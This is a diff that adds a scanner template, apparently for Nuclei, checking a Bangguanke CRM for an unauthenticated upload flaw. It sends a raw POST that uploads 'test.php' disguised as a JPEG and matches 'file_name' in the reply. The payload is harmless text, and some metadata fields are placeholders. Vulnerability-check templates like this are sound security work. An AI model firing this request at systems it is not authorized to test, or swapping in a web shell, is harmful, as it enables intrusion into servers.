@@ -1,0 +1,31 @@
+id: bangguanke-ajax-upload
+info:
+  name: zhangguanjia-ajax-upload
+  author: apple
+  severity: critical
+  description: description
+  reference:
+    - http://wiki.fofamini.com/2023hw/%E5%B8%AE%E7%AE%A1%E5%AE%A2%20CRM%20ajax_upload_chat%20%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E.md
+  tags: tags
+http:
+  - raw:
+      - |-
+        POST /index.php/upload/ajax_upload HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryP85wZUzxCEb9PRNl
+        Cookie: bgk_session=bgk_session=a%3A5%3A%7Bs%3A10%3A%22session_id%22%3Bs%3A32%3A%2270edc36351739620753a2beeca7681a8%22%3Bs%3A10%3A%22ip_address%22%3Bs%3A13%3A%2282.156.29.211%22%3Bs%3A10%3A%22user_agent%22%3Bs%3A119%3A%22Mozilla%2F5.0+%28Macintosh%3B+Intel+Mac+OS+X+10_14_3%29+AppleWebKit%2F605.1.15+%28KHTML%2C+like+Gecko%29+Version%2F12.0.3+Safari%2F605.1.15%22%3Bs%3A13%3A%22last_activity%22%3Bi%3A1691549409%3Bs%3A9%3A%22user_data%22%3Bs%3A0%3A%22%22%3B%7D893b1adbc9cfecf3f5a77a0581ffc946adf90933;
+        Accept-Encoding: gzip
+        Content-Length: 184
+
+        ------WebKitFormBoundaryP85wZUzxCEb9PRNl
+        Content-Disposition: form-data; name="file"; filename="test.php"
+        Content-Type: image/jpeg
+
+        test
+        ------WebKitFormBoundaryP85wZUzxCEb9PRNl--
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'file_name'
